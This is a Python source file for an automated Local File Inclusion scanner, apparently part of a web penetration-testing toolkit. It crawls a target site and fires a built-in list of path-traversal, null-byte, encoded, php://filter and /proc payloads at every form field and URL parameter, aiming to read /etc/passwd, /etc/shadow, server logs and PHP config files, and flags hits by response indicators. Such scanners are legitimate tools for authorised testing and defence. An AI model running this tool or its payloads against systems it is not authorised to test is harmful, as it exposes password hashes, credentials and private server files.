#!/usr/bin/env python3
"""
LFI (Local File Inclusion) Scanner
-------------------------------------
Tests for:
  • Classic path traversal  (../../etc/passwd)
  • PHP filter bypass       (php://filter/convert.base64-encode/resource=)
  • Null-byte injection     (../etc/passwd%00)
  • Encoded traversal       (%2e%2e%2f, %252e%252e%252f)
  • Windows path traversal  (..\\..\\windows\\win.ini)
  • /proc/self/ leakage
"""

import requests
import concurrent.futures
from bs4 import BeautifulSoup
from pathlib import Path
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

# ── Payloads ──────────────────────────────────────────────────────────────────

LFI_PAYLOADS: List[str] = [
    # Linux classic
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "....//....//....//etc/passwd",
    "....\\/....\\/....\\/etc/passwd",
    # Null byte
    "../../../../etc/passwd%00",
    "../../../../etc/passwd\x00",
    # URL encoded
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    # Double encoded
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    # PHP filters
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=../config.php",
    "php://filter/read=string.toupper/resource=index.php",
    "php://input",
    # /proc leakage
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    # Windows
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "../../../../boot.ini",
    "C:/Windows/win.ini",
    # Other Linux
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
]

# Positive indicators in response
LFI_INDICATORS = [
    # Linux /etc/passwd
    "root:x:0:0",
    "daemon:x:",
    "nobody:x:",
    "/bin/bash",
    "/bin/sh",
    # /etc/shadow
    "root:$",
    # /proc/self/environ
    "HTTP_HOST=",
    "DOCUMENT_ROOT=",
    # Windows
    "[extensions]",
    "for 16-bit app support",
    # PHP filter (base64 leak)
    "PD9waHA",  # base64 of "<?ph"
    # Log files
    "GET /",
    "POST /",
    "HTTP/1.",
    # /proc/version
    "Linux version",
    # Generic path leak
    "failed to open stream",
    "include_path",
    "no such file or directory",
]


class LFIScanner:
    """Local File Inclusion vulnerability scanner."""

    PAYLOAD_FILE = Path(__file__).parents[2] / "wordlists" / "payloads" / "lfi.txt"

    def __init__(self, target: str, threads: int = 10, timeout: int = 10, session=None):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        if session is not None:
            self.session = session
        else:
            self.session = requests.Session()
            self.session.headers["User-Agent"] = (
                "WebPwnToolkit/2.0 (Authorized Security Testing)"
            )
            self.session.verify = False
        self.results: List[Dict] = []

    # ── Load payloads ──────────────────────────────────────────────────

    def _load_payloads(self) -> List[str]:
        if self.PAYLOAD_FILE.exists():
            with open(self.PAYLOAD_FILE, encoding="utf-8") as f:
                extra = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            return list(dict.fromkeys(LFI_PAYLOADS + extra))
        return LFI_PAYLOADS

    # ── Detect LFI in response ─────────────────────────────────────────

    def _detect_lfi(self, body: str) -> Optional[str]:
        text = body.lower()
        for indicator in LFI_INDICATORS:
            if indicator.lower() in text:
                return indicator
        return None

    # ── Test a single parameter + payload ─────────────────────────────

    def _test_payload(
        self, url: str, method: str, params: Dict, field: str, payload: str
    ) -> Optional[Dict]:
        test_params = params.copy()
        test_params[field] = payload

        try:
            if method == "post":
                resp = self.session.post(
                    url, data=test_params, timeout=self.timeout, verify=False
                )
            else:
                resp = self.session.get(
                    url, params=test_params, timeout=self.timeout, verify=False
                )

            indicator = self._detect_lfi(resp.text)
            if indicator:
                confidence = (
                    "high"
                    if any(
                        k in indicator
                        for k in [
                            "root:x:",
                            "daemon:x:",
                            "[extensions]",
                            "Linux version",
                        ]
                    )
                    else "medium"
                )

                return {
                    "url": url,
                    "method": method.upper(),
                    "parameter": field,
                    "payload": payload,
                    "type": "Local File Inclusion (LFI)",
                    "severity": "critical" if confidence == "high" else "high",
                    "confidence": confidence,
                    "evidence": indicator[:100],
                    "detail": (
                        f"LFI confirmed in param '{field}' — "
                        f"server returned file contents (indicator: '{indicator}')"
                    ),
                    "owasp": "A03:2021 – Injection",
                    "cvss": 9.1,
                    "remediation": (
                        "Never include files based on user input. "
                        "Use a whitelist of allowed file names. "
                        "Disable allow_url_include and allow_url_fopen in PHP. "
                        "Sanitize path traversal characters (../ ..\\ %2e%2e)."
                    ),
                }
        except Exception:
            pass

        return None

    # ── Test URL query params ──────────────────────────────────────────

    def _test_url_params(self, payloads: List[str]) -> List[Dict]:
        parsed = urlparse(self.target)
        qs = parse_qs(parsed.query)
        if not qs:
            return []

        findings = []
        for field in qs:
            for payload in payloads:
                params = {k: v[0] for k, v in qs.items()}
                result = self._test_payload(self.target, "get", params, field, payload)
                if result and result not in findings:
                    findings.append(result)
        return findings

    # ── Public run ─────────────────────────────────────────────────────

    def run(self) -> List[Dict]:
        from modules.recon.crawler import WebCrawler

        payloads = self._load_payloads()
        console.print(f"  [dim]-> {len(payloads)} LFI payloads loaded[/dim]")

        # Crawl to find forms and parameterized endpoints
        crawl = WebCrawler(
            self.target, threads=self.threads, timeout=self.timeout
        ).run()
        forms = crawl["forms"]
        endpoints = crawl["endpoints"]
        console.print(
            f"  [dim]-> {len(forms)} form(s) | {len(endpoints)} param endpoint(s)[/dim]"
        )

        all_tests = []

        for form in forms:
            all_params = {**form.get("hidden", {}), **form["inputs"]}
            for field in form["inputs"]:
                for payload in payloads:
                    all_tests.append(
                        (form["url"], form["method"], all_params, field, payload)
                    )

        from urllib.parse import parse_qs as _pqs, urlparse as _uparse

        for ep_url in endpoints:
            qs = _pqs(_uparse(ep_url).query)
            for field in qs:
                params = {k: v[0] for k, v in qs.items()}
                for payload in payloads:
                    all_tests.append((ep_url, "get", params, field, payload))

        # Also test original URL
        self.results.extend(self._test_url_params(payloads))

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]LFI scanning...[/cyan]"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console,
        ) as progress:
            task = progress.add_task("lfi", total=len(all_tests))
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
                futures = {
                    ex.submit(self._test_payload, *args): args for args in all_tests
                }
                for future in concurrent.futures.as_completed(futures):
                    progress.advance(task)
                    result = future.result()
                    if result and result not in self.results:
                        self.results.append(result)

        console.print(
            f"  [{'red' if self.results else 'green'}]"
            f"{'⚠ ' + str(len(self.results)) + ' LFI vulnerability(ies) found!' if self.results else '✅ No LFI found'}"
            f"[/]"
        )
        return self.results
